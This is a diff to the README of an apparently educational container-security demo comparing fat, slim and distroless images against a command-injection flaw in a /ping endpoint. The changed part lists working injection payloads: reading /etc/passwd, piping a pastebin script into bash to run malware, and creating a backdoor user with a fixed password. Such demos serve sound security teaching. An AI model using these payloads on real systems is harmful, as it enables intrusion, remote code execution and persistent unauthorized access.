@@ -1,5 +1,17 @@
 # From fat to fearless - distroless way
 
+## ⚠️ Disclaimer and Educational Purpose
+
+This project is designed for **educational and research purposes only**. It demonstrates the security implications of different container base images and how they affect vulnerability exposure, particularly for Remote Code Execution (RCE) attacks.
+
+**The vulnerabilities demonstrated in this project should NOT be used for:**
+- Launching actual exploits against systems you do not own
+- Unauthorized penetration testing
+- Malicious activities of any kind
+- Any illegal activities
+
+**No liability**: The creator of this project accept no responsibility for any misuse of the information or code contained herein. Users are expected to use this information responsibly and in compliance with all applicable laws and regulations.
+
 ## Container Security Analysis: Fat, Slim, and Distroless Images
 
 This project demonstrates the security implications of different container base images and how they affect vulnerability exposure, particularly for Remote Code Execution (RCE) attacks.
@@ -56,7 +68,8 @@ The vulnerability allows RCE in fat and slim images because they contain:
 - `/ping?ip=127.0.0.1;cat /etc/passwd` - Read sensitive files
 - `/ping?ip=127.0.0.1;whoami` - Identify user context
 - `/ping?ip=127.0.0.1;dpkg --get-selections` - Identifies which utilies are present
-- `/ping?ip=127.0.0.1;curl https://pastebin.com/raw/jsBbM758 | bash` - Download and execute malware
+- `/ping?ip=127.0.0.1;curl https://pastebin.com/raw/jsBbM758 | bash` - Download and execute malware or use this in case of slim where curl is not present
+`/ping?ip=127.0.0.1;echo%20%22%5B*%5D%20Creating%20backdoor%20user%20(if%20root)...%22%0Auseradd%20backdoor%20-p%20%24(openssl%20passwd%20-1%20password123)%202%3E%2Fdev%2Fnull%20%7C%7C%20true`
 - `/ping?ip=127.0.0.1;cat /etc/passwd` - Verify, if backdoor is created and persistance is achieved
 
 #### In Distroless Images
